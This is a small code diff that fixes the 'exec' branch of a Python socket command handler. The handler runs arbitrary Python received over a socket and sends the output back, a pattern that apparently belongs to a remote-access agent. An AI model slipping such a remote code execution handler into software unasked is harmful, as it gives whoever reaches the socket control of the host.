@@ -111,8 +111,8 @@ def process_command(sock, *args):
 
 
 	if command == 'exec':
-		proc = subprocess.Popen(['python', '-c', args[1:]], stdout=subprocess.PIPE)
-		sock.send(proc.stdout.encode())
+		proc = subprocess.Popen(['python', '-c', *args[1:]], stdout=subprocess.PIPE)
+		sock.send(proc.stdout.read())
 		return
 
 
